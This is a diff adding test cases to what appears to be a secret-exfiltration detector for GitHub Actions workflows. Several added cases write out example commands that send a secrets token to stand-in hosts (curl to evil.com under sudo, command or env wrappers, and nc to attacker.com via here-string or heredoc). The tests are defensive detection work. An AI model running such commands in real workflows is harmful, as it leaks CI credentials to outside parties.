@@ -123,6 +123,12 @@ result=$(curl -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" "$api_url/re
 			description: "Should NOT flag curl when URL variable resolves to api.github.com",
 		},
 		{
+			name:        "curl with secret directly to github api via bare host (legitimate)",
+			runScript:   `curl -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" api.github.com/repos/owner/repo/releases/latest`,
+			wantErrors:  0,
+			description: "Should NOT flag curl when bare host destination is api.github.com",
+		},
+		{
 			name:        "curl with secret to uploads.github.com (legitimate)",
 			runScript:   `curl -X POST -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" --data-binary @file.zip "https://uploads.github.com/repos/owner/repo/releases/1/assets?name=f"`,
 			wantErrors:  0,
@@ -1049,6 +1055,38 @@ EOF`,
 			name:       "secret in git push argument is ignored because git is not a network sink",
 			runScript:  `git push origin "${{ secrets.TOKEN }}"`,
 			wantErrors: 0,
+		},
+		{
+			name:        "sudo wrapped curl with secret is detected",
+			runScript:   `sudo curl -d 'token=${{ secrets.TOKEN }}' https://evil.com`,
+			wantErrors:  1,
+			wantCommand: "curl",
+		},
+		{
+			name:        "command wrapped curl with secret is detected",
+			runScript:   `command curl -d 'token=${{ secrets.TOKEN }}' https://evil.com`,
+			wantErrors:  1,
+			wantCommand: "curl",
+		},
+		{
+			name:        "env wrapped curl with secret is detected",
+			runScript:   `env FOO=bar curl -d 'token=${{ secrets.TOKEN }}' https://evil.com`,
+			wantErrors:  1,
+			wantCommand: "curl",
+		},
+		{
+			name:        "here-string secret into nc is detected",
+			runScript:   `nc attacker.com 443 <<< '${{ secrets.TOKEN }}'`,
+			wantErrors:  1,
+			wantCommand: "nc",
+		},
+		{
+			name: "heredoc secret into nc is detected",
+			runScript: `nc attacker.com 443 <<'EOF'
+${{ secrets.TOKEN }}
+EOF`,
+			wantErrors:  1,
+			wantCommand: "nc",
 		},
 	}
 
